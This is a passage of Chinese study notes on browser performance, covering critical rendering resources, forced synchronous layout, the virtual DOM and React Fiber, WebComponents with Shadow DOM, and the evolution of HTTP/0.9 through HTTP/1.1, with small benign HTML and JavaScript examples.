关键资源大小，通常情况下，所有关键资源的内容越小，其整个资源的下载时间也就越短，那么阻塞渲染的时间也就越短。 请求关键资源需要多少个 RTT（Round Trip Time），当使用 TCP 协议传输一个文件时，这个数据并不是一次传输到服务端的，而是需要拆分成一个个数据包来回多次进行传输的。RTT 就是这里的往返时延。它是网络中一个重要的性能指标，表示从发送端发送数据开始，到发送端收到来自接收端的确认，总共经历的时延。通常 1 个 HTTP 的数据包在 14KB 左右，所以 1 个 0.1M 的页面就需要拆分成 8 个包来传输了，也就是说需要 8 个 RTT。 结合上图来看看它的关键资源请求需要多少个 RTT。首先是请求 HTML 资源，大小是 6KB，小于 14KB，所以 1 个 RTT 就可以解决了。至于 JavaScript 和 CSS 文件，这里需要注意一点，由于渲染引擎有一个预解析的线程，在接收到 HTML 数据之后，预解析线程会快速扫描 HTML 数据中的关键资源，一旦扫描到了，会立马发起请求，你可以认为 JavaScript 和 CSS 是同时发起请求的，所以它们的请求是重叠的，那么计算它们的 RTT 时，只需要计算体积最大的那个数据就可以了。这里最大的是 CSS 文件（9KB），所以我们就按照 9KB 来计算，同样由于 9KB 小于 14KB，所以 JavaScript 和 CSS 资源也就可以算成 1 个 RTT。也就是说，上图中关键资源请求共花费了 2 个 RTT。\n优化方案：\n总的优化原则就是减少关键资源个数，降低关键资源大小，降低关键资源的 RTT 次数。\n减少关键资源的个数，一种方式是可以将 JavaScript 和 CSS 改成内联的形式，另一种方式，如果 JavaScript 代码没有 DOM 或者 CSSOM 的操作，则可以改成 sync 或者 defer 属性；同样对于 CSS，如果不是在构建页面之前加载的，则可以添加媒体取消阻止显现的标志。当 JavaScript 标签加上了 sync 或者 defer、CSSlink 属性之前加上了取消阻止显现的标志后，它们就变成了非关键资源了。 减少关键资源，可以压缩 CSS 和 JavaScript 资源，移除 HTML、CSS、JavaScript 文件中一些注释内容，也可以通过前面讲的取消 CSS 或者 JavaScript 中关键资源的方式。 减少关键资源 RTT 的次数，可以通过减少关键资源的个数和减少关键资源的大小搭配来实现。除此之外，还可以使用 CDN 来减少每次 RTT 时长。 在优化实际的页面加载速度时，你可以先画出优化之前关键资源的图表，然后按照上面优化关键资源的原则去优化，优化完成之后再画出优化之后的关键资源图表。\n优化交互阶段 谈交互阶段的优化，其实就是在谈渲染进程渲染帧的速度，因为在交互阶段，帧的渲染速度决定了交互的流畅度。\n讨论页面优化实际上就是讨论渲染引擎是如何渲染帧的，否则就无法优化帧率。\n交互阶段的渲染流水线（如下图）\n和加载阶段的渲染流水线有一些不同的地方是，在交互阶段没有了加载关键资源和构建 DOM、CSSOM 流程，通常是由 JavaScript 触发交互动画的。\n交互阶段是如何生成一个帧的？大部分情况下，生成一个新的帧都是由 JavaScript 通过修改 DOM 或者 CSSOM 来触发的。还有另外一部分帧是由 CSS 来触发的。\n如果在计算样式阶段发现有布局信息的修改，那么就会触发重排操作，然后触发后续渲染流水线的一系列操作，这个代价是非常大的。\n如果在计算样式阶段没有发现有布局信息的修改，只是修改了颜色一类的信息，那么就不会涉及到布局相关的调整，所以可以跳过布局阶段，直接进入绘制阶段，这个过程叫重绘。不过重绘阶段的代价也是不小的。\n通过 CSS 实现一些变形、渐变、动画等特效，这是由 CSS 触发的，并且是在合成线程上执行的，这个过程称为合成。因为它不会触发重排或者重绘，而且合成操作本身的速度就非常快，所以执行合成是效率最高的方式。\n优化方案：\n一个大的原则就是让单个帧的生成速度变快。（不影响单帧的生成速度）\n减少 JavaScript 脚本执行时间（在交互阶段，对 JavaScript 脚本总的原则就是不要一次霸占太久主线程）有时 JavaScript 函数的一次执行时间可能有几百毫秒，这就严重霸占了主线程执行其他渲染任务的时间。针对这种情况我们可以采用以下两种策略：\n一种是将一次执行的函数分解为多个任务，使得每次的执行时间不要过久。 另一种是采用 Web Workers。你可以把 Web Workers 当作主线程之外的一个线程，在 Web Workers 中是可以执行 JavaScript 脚本的，不过 Web Workers 中没有 DOM、CSSOM 环境，这意味着在 Web Workers 中是无法通过 JavaScript 来访问 DOM 的，所以我们可以把一些和 DOM 操作无关且耗时的任务放到 Web Workers 中去执行。 避免强制同步布局通过 DOM 接口执行添加元素或者删除元素等操作后，是需要重新计算样式和布局的，不过正常情况下这些操作都是在另外的任务中异步完成的，这样做是为了避免当前的任务占用太长的主线程时间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;mian_div\u0026#34;\u0026gt; \u0026lt;li id=\u0026#34;time_li\u0026#34;\u0026gt;time\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;geekbang\u0026lt;/li\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;p id=\u0026#34;demo\u0026#34;\u0026gt;强制布局 demo\u0026lt;/p\u0026gt; \u0026lt;button onclick=\u0026#34;foo()\u0026#34;\u0026gt;添加新元素\u0026lt;/button\u0026gt; \u0026lt;script\u0026gt; function foo() { let main_div = document.getElementById(\u0026#34;mian_div\u0026#34;); let new_node = document.createElement(\u0026#34;li\u0026#34;); let textnode = document.createTextNode(\u0026#34;time.geekbang\u0026#34;); new_node.appendChild(textnode); document.getElementById(\u0026#34;mian_div\u0026#34;).appendChild(new_node); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 对于上面这段代码，我们可以使用 Performance 工具来记录添加元素的过程，如下图所示：\n从图中可以看出来，执行 JavaScript 添加元素是在一个任务中执行的，重新计算样式布局是在另外一个任务中执行，这就是正常情况下的布局操作。\n强制同步布局:\n所谓强制同步布局，是指 JavaScript 强制将计算样式和布局操作提前到当前的任务中。为了直观理解，这里我们对上面的代码做了一点修改，让它变成强制同步布局，修改后的代码如下所示：\n1 2 3 4 5 6 7 8 9 10 11 function foo() { let main_div = document.getElementById(\u0026#34;mian_div\u0026#34;); let new_node = document.createElement(\u0026#34;li\u0026#34;); let textnode = document.createTextNode(\u0026#34;time.geekbang\u0026#34;); new_node.appendChild(textnode); document.getElementById(\u0026#34;mian_div\u0026#34;).appendChild(new_node); // 由于要获取到 offsetHeight， // 但是此时的 offsetHeight 还是老的数据， // 所以需要立即执行布局操作 console.log(main_div.offsetHeight); } 将新的元素添加到 DOM 之后，我们又调用了main_div.offsetHeight来获取新 main_div 的高度信息。如果要获取到 main_div 的高度，就需要重新布局，所以这里在获取到 main_div 的高度之前，JavaScript 还需要强制让渲染引擎默认执行一次布局操作。我们把这个操作称为强制同步布局。\n可以看下面通过 Performance 记录的任务状态：\n从上图可以看出来，计算样式和布局都是在当前脚本执行过程中触发的，这就是强制同步布局。\n为了避免强制同步布局，我们可以调整策略，在修改 DOM 之前查询相关值。代码如下所示：\n1 2 3 4 5 6 7 8 9 function foo() { let main_div = document.getElementById(\u0026#34;mian_div\u0026#34;); // 为了避免强制同步布局，在修改 DOM 之前查询相关值 console.log(main_div.offsetHeight); let new_node = document.createElement(\u0026#34;li\u0026#34;); let textnode = document.createTextNode(\u0026#34;time.geekbang\u0026#34;); new_node.appendChild(textnode); document.getElementById(\u0026#34;mian_div\u0026#34;).appendChild(new_node); } 避免布局抖动所谓布局抖动，是指在一次 JavaScript 执行过程中，多次执行强制布局和抖动操作。\n1 2 3 4 5 6 7 8 9 10 11 function foo() { let time_li = document.getElementById(\u0026#34;time_li\u0026#34;); for (let i = 0; i \u0026lt; 100; i++) { let main_div = document.getElementById(\u0026#34;mian_div\u0026#34;); let new_node = document.createElement(\u0026#34;li\u0026#34;); let textnode = document.createTextNode(\u0026#34;time.geekbang\u0026#34;); new_node.appendChild(textnode); new_node.offsetHeight = time_li.offsetHeight; document.getElementById(\u0026#34;mian_div\u0026#34;).appendChild(new_node); } } 我们在一个 for 循环语句里面不断读取属性值，每次读取属性值之前都要进行计算样式和布局。执行代码之后，使用 Performance 记录的状态如下所示：\n从上图可以看出，在 foo 函数内部重复执行计算样式和布局，这会大大影响当前函数的执行效率。这种情况的避免方式和强制同步布局一样，都是尽量不要在修改 DOM 结构时再去查询一些相关值。\n合理利用 CSS 合成动画\n合成动画是直接在合成线程上执行的，这和在主线程上执行的布局、绘制等操作不同，如果主线程被 JavaScript 或者一些布局任务占用，CSS 动画依然能继续执行。所以要尽量利用好 CSS 合成动画，如果能让 CSS 处理动画，就尽量交给 CSS 来操作。另外，如果能提前知道对某个元素执行动画操作，那就最好将其标记为 will-change，这是告诉渲染引擎需要将该元素单独生成一个图层。\n避免频繁的垃圾回收 JavaScript 使用了自动垃圾回收机制，如果在一些函数中频繁创建临时对象，那么垃圾回收器也会频繁地去执行垃圾回收策略。这样当垃圾回收操作发生时，就会占用主线程，从而影响到其他任务的执行，严重的话还会让用户产生掉帧、不流畅的感觉。所以要尽量避免产生那些临时垃圾数据。那该怎么做呢？可以尽可能优化储存结构，尽可能避免小颗粒对象的产生。\n虚拟 DOM 虚拟 DOM 和实际的 DOM 有何不同？\n真实 DOM 的缺陷 调用document.body.appendChild(node)往 body 节点上添加一个元素，调用该 API 之后会引发一系列的连锁反应。首先渲染引擎会将 node 节点添加到 body 节点之上，然后触发样式计算、布局、绘制、栅格化、合成等任务，我们把这一过程称为重排。\n除了重排之外，还有可能引起重绘或者合成操作。另外，对于 DOM 的不当操作还有可能引发强制同步布局和布局抖动的问题，这些操作都会大大降低渲染效率。因此，对于 DOM 的操作我们时刻都需要非常小心谨慎。\n对于一些复杂的页面或者目前使用非常多的单页应用来说，其 DOM 结构是非常复杂的，而且还需要不断地去修改 DOM 树，每次操作 DOM ，渲染引擎都需要进行重排、重绘或者合成等操作，因为 DOM 结构复杂，所生成的页面结构也会很复杂，对于这些复杂的页面，执行一次重排或者重绘操作都是非常耗时的，这就给我们带来了真正的性能问题。\n所以我们需要有一种方式来减少 JavaScript 对 DOM 的操作，这时候虚拟 DOM 就上场了。\n什么是虚拟 DOM 虚拟 DOM 要解决哪些事情 将页面改变的内容应用到虚拟 DOM 上，而不是直接应用到 DOM 上。\n变化被应用到虚拟 DOM 上时，虚拟 DOM 并不急着去渲染页面，而仅仅是调整虚拟 DOM 的内部状态，这样操作虚拟 DOM 的代价就变得非常轻了。\n在虚拟 DOM 收集到足够的改变时，再把这些变化一次性应用到真实的 DOM 上。\nReact 中的虚拟 DOM\n创建阶段。首先依据 JSX 和基础数据创建出来虚拟 DOM，它反映了真实的 DOM 树的结构。然后由虚拟 DOM 树创建出真实 DOM 树，真实的 DOM 树生成完后，再触发渲染流水线往屏幕输出页面。 更新阶段。如果数据发生了改变，那么就需要根据新的数据创建一个新的虚拟 DOM 树；然后 React 比较两个树，找出变化的地方，并把变化的地方一次性更新到真实的 DOM 树上；最后渲染引擎更新渲染流水线，并生成新的页面。 React Fiber 更新机制\n当有数据更新时，React 会生成一个新的虚拟 DOM，然后拿新的虚拟 DOM 和之前的虚拟 DOM 进行比较，这个过程会找出变化的节点，然后再将变化的节点应用到 DOM 上。\n重点关注下比较过程，最开始的时候，比较两个虚拟 DOM 的过程是在一个递归函数里执行的，其核心算法是 reconciliation。通常情况下，这个比较过程执行得很快，不过当虚拟 DOM 比较复杂的时候，执行比较函数就有可能占据主线程比较久的时间，这样就会导致其他任务的等待，造成页面卡顿。为了解决这个问题，React 团队重写了 reconciliation 算法，新的算法称为 Fiber reconciler，之前老的算法称为 Stack reconciler。\n协程的另外一个称呼就是 Fiber，所以在这里可以把 Fiber 和协程关联起来，那么所谓的 Fiber reconciler，就是在执行算法的过程中出让主线程，这样就解决了 Stack reconciler 函数占用时间过久的问题。\n从双缓存和 MVC 模型这两个视角看虚拟 DOM\n双缓存 在开发游戏或者处理其他图像的过程中，屏幕从前缓冲区读取数据然后显示。但是很多图形操作都很复杂且需要大量的运算，比如一幅完整的画面，可能需要计算多次才能完成，如果每次计算完一部分图像，就将其写入缓冲区，那么就会造成一个后果，那就是在显示一个稍微复杂点的图像的过程中，你看到的页面效果可能是一部分一部分地显示出来，因此在刷新页面的过程中，会让用户感受到界面的闪烁。\n而使用双缓存，可以让你先将计算的中间结果存放在另一个缓冲区中，等全部的计算结束，该缓冲区已经存储了完整的图形之后，再将该缓冲区的图形数据一次性复制到显示缓冲区，这样就使得整个图像的输出非常稳定。\n在这里，你可以把虚拟 DOM 看成是 DOM 的一个 buffer，和图形显示一样，它会在完成一次完整的操作之后，再把结果应用到 DOM 上，这样就能减少一些不必要的更新，同时还能保证 DOM 的稳定输出。\nMVC 模式 虚拟 DOM 是一种类似双缓存的实现。\n虚拟 DOM 在 MVC 模式中的作用。\nMVC 能将数据和视图进行分离，在涉及到一些复杂的项目时，能够大大减轻项目的耦合度，使得程序易于维护。\n其核心思想就是将数据和视图分离，也就是说视图和模型之间是不允许直接通信的，它们之间的通信都是通过控制器来完成的。通常情况下的通信路径是视图发生了改变，然后通知控制器，控制器再根据情况判断是否需要更新模型数据。当然还可以根据不同的通信路径和控制器不同的实现方式，基于 MVC 又能衍生出很多其他的模式，如 MVP、MVVM 等，不过万变不离其宗，它们的基础骨架都是基于 MVC 而来。\n所以在分析基于 React 或者 Vue 这些前端框架时，我们需要先重点把握大的 MVC 骨架结构，然后再重点查看通信方式和控制器的具体实现方式，这样我们就能从架构的视角来理解这些前端框架了。比如在分析 React 项目时，我们可以把 React 的部分看成是一个 MVC 中的视图，在项目中结合 Redux 就可以构建一个 MVC 的模型结构，如下图所示：\n在该图中，可以把虚拟 DOM 看成是 MVC 的视图部分，其控制器和模型都是由 Redux 提供的。其具体实现过程如下：\n图中的控制器是用来监控 DOM 的变化，一旦 DOM 发生变化，控制器便会通知模型，让其更新数据； 模型数据更新好之后，控制器会通知视图，告诉它模型的数据发生了变化； 视图接收到更新消息之后，会根据模型所提供的数据来生成新的虚拟 DOM； 新的虚拟 DOM 生成好之后，就需要与之前的虚拟 DOM 进行比较，找出变化的节点； 比较出变化的节点之后，React 将变化的虚拟节点应用到 DOM 上，这样就会触发 DOM 节点的更新； DOM 节点的变化又会触发后续一系列渲染流水线的变化，从而实现页面的更新。 在实际工程项目中，你需要学会分析出这各个模块，并梳理出它们之间的通信关系，这样对于任何框架你都能轻松上手。\n渐进式网页应用（PWA） 它究竟解决了 Web 应用的哪些问题？\nWeb 应用移动化是 Google 梦寐以求而又一直在发力的一件事，不过对于移动设备来说，前有本地 App，后有移动小程序，想要浏览器切入到移动端是相当困难的一件事，因为浏览器的运行性能是低于本地 App 的，并且 Google 也没有类似微信或者 Facebook 这种体量的用户群体。\n什么是 PWA？PWA 又是以什么方式切入到移动端的呢？\nPWA，全称是 Progressive Web App，翻译过来就是渐进式网页应用。“渐进式 +Web 应用”\n对于 Web 应用很好理解了，就是目前我们普通的 Web 页面，所以 PWA 所支持的首先是一个 Web 页面。\n“渐进式”，就需要从下面两个方面来理解：\n站在 Web 应用开发者来说，PWA 提供了一个渐进式的过渡方案，让普通站点逐步过渡到 Web 应用。采取渐进式可以降低站点改造的代价，使得站点逐步支持各项新技术，而不是一步到位。 站在技术角度来说，PWA 技术也是一个渐进式的演化过程，在技术层面会一点点演进，比如逐渐提供更好的设备特性支持，不断优化更加流畅的动画效果，不断让页面的加载速度变得更快，不断实现本地应用的特性。 从这两点可以看出来，PWA 采取的是非常一个缓和的渐进式策略，不再像以前那样激进，动不动就是取代本地 App、取代小程序。与之相反，而是要充分发挥 Web 的优势，渐进式地缩短和本地应用或者小程序的距离。\n、\nWebComponent WebComponent 是一套技术的组合，能提供给开发者组件化开发的能力。\n什么是组件化？\n对内高内聚，对外低耦合。对内各个元素彼此紧密结合、相互依赖，对外和其他组件的联系最少且接口简单。\n多人协作开发，每个人负责的组件需要尽可能独立完成自己的功能，其组件的内部状态不能影响到别人的组件，在需要和其他组件交互的地方得提前协商好接口。通过组件化可以降低整个系统的耦合度，同时也降低程序员之间沟通复杂度，让系统变得更加易于维护。\n大部分语言都能实现组件化，归根结底在于编程语言特性，大多数语言都有自己的函数级作用域、块级作用域和类，可以将内部的状态数据隐藏在作用域之下或者对象的内部，这样外部就无法访问了，然后通过约定好的接口和外部进行通信。\nJavaScript 虽然有不少缺点，但是作为一门编程语言，它也能很好地实现组件化，毕竟有自己的函数级作用域和块级作用域，所以封装内部状态数据并提供接口给外部都是没有问题的。\n阻碍前端组件化的因素 CSS 的全局属性会阻碍组件化 DOM 也阻碍组件化 HTML 和 CSS 是如何阻碍前端组件化。\n1 2 3 4 5 6 7 \u0026lt;style\u0026gt; p { background-color: brown; color: cornsilk; } \u0026lt;/style\u0026gt; \u0026lt;p\u0026gt;time.geekbang.org\u0026lt;/p\u0026gt; 1 2 3 4 5 6 \u0026lt;style\u0026gt; p { background-color: red; color: blue } \u0026lt;p\u0026gt;time.geekbang\u0026lt;/p\u0026gt; 上面这两段代码分别实现了自己 p 标签的属性，如果两个人分别负责开发这两段代码的话，那么在测试阶段可能没有什么问题，不过当最终项目整合的时候，其中内部的 CSS 属性会影响到其他外部的 p 标签的，之所以会这样，是因为 CSS 是影响全局的。\n渲染引擎会将所有的 CSS 内容解析为 CSSOM，在生成布局树的时候，会在 CSSOM 中为布局树中的元素查找样式，所以有两个相同标签最终所显示出来的效果是一样的，渲染引擎是不能为它们分别单独设置样式的。\n在页面中只有一个 DOM，任何地方都可以直接读取和修改 DOM。所以使用 JavaScript 来实现组件化是没有问题的，但是 JavaScript 一旦遇上 CSS 和 DOM，那么就相当难办了。\nWebComponent 组件化开发 CSS 和 DOM 是阻碍组件化的两个因素，那要怎么解决?\nWebComponent 给出了解决思路，它提供了对局部视图封装能力，可以让 DOM、CSSOM 和 JavaScript 运行在局部环境中，这样就使得局部的 CSS 和 DOM 不会影响到全局。\n下面就结合具体代码来看看 WebComponent 是怎么实现组件化的：\nWebComponent 是一套技术的组合，具体涉及到了Custom elements（自定义元素）、Shadow DOM（影子 DOM）**和**HTML templates（HTML 模板），详细内容参考 MDN 上的相关链接。\n要使用 WebComponent，通常要实现下面三个步骤：\n首先，使用 template 属性来创建模板。利用 DOM 可以查找到模板的内容，但是模板元素是不会被渲染到页面上的，也就是说 DOM 树中的 template 节点不会出现在布局树中，所以我们可以使用 template 来自定义一些基础的元素结构，这些基础的元素结构是可以被重复使用的。一般模板定义好之后，我们还需要在模板的内部定义样式信息。\n需要创建一个 GeekBang 的类 在该类的构造函数中要完成三件事：\n查找模板内容； 创建影子 DOM； 再将模板添加到影子 DOM 上。 影子 DOM 的作用是将模板中的内容与全局 DOM 和 CSS 进行隔离，这样我们就可以实现元素和样式的私有化了。你可以把影子 DOM 看成是一个作用域，其内部的样式和元素是不会影响到全局的样式和元素的，而在全局环境下，要访问影子 DOM 内部的样式或者元素也是需要通过约定好的接口的。\n影子 DOM，我们就实现了 CSS 和元素的封装，在创建好封装影子 DOM 的类之后，我们就可以使用 customElements.define 来自定义元素了\n像正常使用 HTML 元素一样使用该元素\n下面我们就来演示下这 3 个技术是怎么实现数据封装的，如下面代码所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 一：定义模板 二：定义内部 CSS 样式 三：定义 JavaScript 行为 --\u0026gt; \u0026lt;template id=\u0026#34;geekbang-t\u0026#34;\u0026gt; \u0026lt;style\u0026gt; p { background-color: brown; color: cornsilk; } div { width: 200px; background-color: bisque; border: 3px solid chocolate; border-radius: 10px; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;time.geekbang.org\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;time1.geekbang.org\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; function foo() { console.log(\u0026#34;inner log\u0026#34;); } \u0026lt;/script\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; class GeekBang extends HTMLElement { constructor() { super(); // 获取组件模板 const content = document.querySelector(\u0026#34;#geekbang-t\u0026#34;).content; // 创建影子 DOM 节点 const shadowDOM = this.attachShadow({ mode: \u0026#34;open\u0026#34; }); // 将模板添加到影子 DOM 上 shadowDOM.appendChild(content.cloneNode(true)); } } customElements.define(\u0026#34;geek-bang\u0026#34;, GeekBang); \u0026lt;/script\u0026gt; \u0026lt;geek-bang\u0026gt;\u0026lt;/geek-bang\u0026gt; \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;time.geekbang.org\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;time1.geekbang.org\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;geek-bang\u0026gt;\u0026lt;/geek-bang\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 效果图：\n从图中我们可以看出，影子 DOM 内部的样式是不会影响到全局 CSSOM 的。另外，使用 DOM 接口也是无法直接查询到影子 DOM 内部元素的，比如你可以使用document.getElementsByTagName('div')来查找所有 div 元素，这时候你会发现影子 DOM 内部的元素都是无法查找的，因为要想查找影子 DOM 内部的元素需要专门的接口，所以通过这种方式又将影子内部的 DOM 和外部的 DOM 进行了隔离。\n通过影子 DOM 可以隔离 CSS 和 DOM，不过需要注意一点，影子 DOM 的 JavaScript 脚本是不会被隔离的，比如在影子 DOM 定义的 JavaScript 函数依然可以被外部访问，这是因为 JavaScript 语言本身已经可以很好地实现组件化了。\n浏览器如何实现影子 DOM 影子 DOM 的作用主要有以下两点：\n影子 DOM 中的元素对于整个网页是不可见的； 影子 DOM 的 CSS 不会影响到整个网页的 CSSOM，影子 DOM 内部的 CSS 只对内部的元素起作用。 那么浏览器是如何实现影子 DOM 的呢？下面我们就来分析下，如下图：\n该图是上面那段示例代码对应的 DOM 结构图，从图中可以看出，我们使用了两次 geek-bang 属性，那么就会生成两个影子 DOM，并且每个影子 DOM 都有一个 shadow root 的根节点，我们可以将要展示的样式或者元素添加到影子 DOM 的根节点上，每个影子 DOM 你都可以看成是一个独立的 DOM，它有自己的样式、自己的属性，内部样式不会影响到外部样式，外部样式也不会影响到内部样式。\n浏览器为了实现影子 DOM 的特性，在代码内部做了大量的条件判断，比如当通过 DOM 接口去查找元素时，渲染引擎会去判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是影子 DOM，那么就直接跳过 shadow-root 元素的查询操作。所以这样通过 DOM API 就无法直接查询到影子 DOM 的内部元素了。\n另外，当生成布局树的时候，渲染引擎也会判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是，那么在影子 DOM 内部元素的节点选择 CSS 样式的时候，会直接使用影子 DOM 内部的 CSS 属性。所以这样最终渲染出来的效果就是影子 DOM 内部定义的样式。\n问：你是怎么看待 WebComponents 和前端框架（React、Vue）之间的关系的？\nHTTP 及其性能优化 学习 HTTP 发展史，各个版本在发展过程中遇到的瓶颈和对应的解决方法。\nHTTP/0.9 91 年提出，主要用于学术交流。\n需求：用来在网络之间只传递体积很小的 HTML 超文本内容。它采用了基于请求响应的模式，从客户端发出请求，服务器返回数据。\nHTTP/0.9 的一个完整的请求流程：\n客户端先根据 IP 地址、端口和服务器三次握手建立 TCP 连接。 建立好连接之后，只会发送一个 GET 请求行的信息，如 GET /index.html 用来获取 index.html。 服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 ASCII 字符流返回给客户端。 HTML 文档传输完成后，断开连接。 HTTP/0.9 的实现有以下三个特点：\n只有一个请求行，没有请求头和请求体，因为只需要一个请求行就可以完整表达客户端的需求。\n服务器没有响应头信息，因为服务器端并不需要告诉客户端太多信息，只需要返回数据。\n返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输。\nhttp0.9 能满足当时的需求，但是 94 年大众可以通过拨号上网，同时网景浏览器的推出，让万维网进入大众视野，又有了新的需求，而 HTTP/0.9 已经不能适用，这就是 HTTP/1.0 诞生的原因。\n新兴网络都带来了哪些新需求？\n浏览器中展示的不单是 HTML 文件，还包括 JavaScript、CSS、图片、音频、视频等不同类型的文件。需要支持多种类型的文件 文件格式不仅仅局限于 ASCII 编码，还有很多其他类型编码的文件 HTTP/1.0 如何实现多种类型文件的下载？\nHTTP/1.0 引入请求头和响应头，它们都是以为 Key-Value 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。 HTTP/1.0 具体的请求流程：\n怎么通过请求头和响应头来支持多种不同类型的数据？\n要支持多种类型的文件，就需要解决以下几个问题：\n浏览器需要知道服务器返回的数据是什么类型，然后浏览器才能根据不同的数据类型做针对性的处理。 一个完整应用包含的单个文件的数据量也变得越来越多和大。为了减轻传输性能，服务器会对数据进行压缩后再传输，所以浏览器需要知道服务器压缩的方法。 由于互联网是全球性的服务，所以服务器需要对不同的地区提供不同的语言版本，这就需要浏览器告诉服务器它想要什么语言版本的页面（国际化）。 由于增加了各种不同类型的文件，而每种文件的编码形式又可能不一样，为了能够准确地读取文件，浏览器需要知道文件的编码类型。 HTTP/1.0 的方案是通过请求头和响应头来进行协商，在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：\n1 2 3 4 accept: text/html // 期望服务器返回 html 类型的文件 accept-encoding: gzip, deflate, br // 接受服务器可以采用 gzip、deflate 或者 br 其中的一种压缩方式 accept-Charset: ISO-8859-1,utf-8 // 期望返回的文件编码是 UTF-8 或者 ISO-8859-1 accept-language: zh-CN,zh // 期望页面的优先语言是中文 服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。如果浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据响应头的信息来处理数据。下面是一段响应头的数据信息：\n1 2 content-encoding: br // 表示服务器采用了 br 的压缩方法 content-type: text/html; charset=UTF-8 //表示服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8 有了响应头的信息，浏览器就会使用 br 方法来解压文件，再按照 UTF-8 的编码格式来处理原始文件，最后按照 HTML 的方式来解析该文件。这就是 HTTP/1.0 支持多文件的一个基本的处理流程。\nHTTP/1.0 的其他特性 HTTP/1.0 引入了持久连接，但是需要主动开启。\n有的请求服务器可能无法处理，或者处理出错，需要告诉浏览器服务器最终处理该请求的情况，这就引入了状态码。状态码是通过响应行的方式来通知浏览器的。\n为了减轻服务器的压力，在 HTTP/1.0 中提供了 Cache 机制，用来缓存已经下载过的数据。\n服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP/1.0 的请求头中还加入了用户代理的字段。\nHTTP/1.0 的问题 每个 HTTP 请求都伴随一个一次完整的 TCP 连接的建立到断开 HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段（如下图）。\n在当时，由于通信的文件比较小，而且每个页面的引用也不多，这个问题并不严重。但是随着浏览器普及，单个页面中的图片文件越来越多，有时候一个页面可能包含了几百个外部引用的资源文件，如果在下载每个文件的时候，都需要经历建立 TCP 连接、传输数据和断开连接这样的步骤，无疑会增加大量无谓的开销。\n每个域名绑定了一个唯一的 IP 地址，因此一个服务主机器只能支持一个域名 在设计 HTTP/1.0 时，需要在响应头中设置完整的数据大小，如 Content-Length: 901，这样浏览器就可以根据设置的数据大小来接收数据。 HTTP/1.1 HTTP/1.1 引入了默认就开启了持久连接， Cookie、虚拟主机的支持、对动态内容的支持等特性。****\n如果服务器同意保持连接打开，它会在响应中返回同样的Connection: keep-alive头部。但是需要注意的是，由于 HTTP/1.0 并没有明确规定如何处理持久连接的所有细节，因此这种方法并不是所有实现都支持，并且可能存在互操作性问题。\n相比之下，HTTP/1.1 默认启用了持久连接，不再需要显式的Connection: keep-alive头部来维持连接。只有当一方想要关闭连接时，才会发送Connection: close头部。\n持久连接 HTTP/1.1 中增加了持久连接，它的特点是在一个 TCP 连接上可以传输多个 HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持。\nHTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。\n持久连接在 HTTP/1.1 中是默认开启的，所以不需要专门为了持久连接去 HTTP 请求头设置信息，如果不想要采用持久连接，可以在 HTTP 请求头中加上 Connection: close。\n目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。\n持久连接的不足 持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是队头阻塞。\nHTTP/1.1 中试图通过管线化的技术来解决队头阻塞的问题。\nHTTP/1.1 中的管线化是指将多个 HTTP 请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。\nFireFox、Chrome 都做过管线化的试验，但是由于各种原因，它们最终都放弃了管线化技术。\n提供虚拟主机的支持 随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。\n因此，HTTP/1.1 的请求头中增加了 Host 字段，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。\n对动态生成的内容提供支持 随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。\nHTTP/1.1 通过引入 Chunk transfer 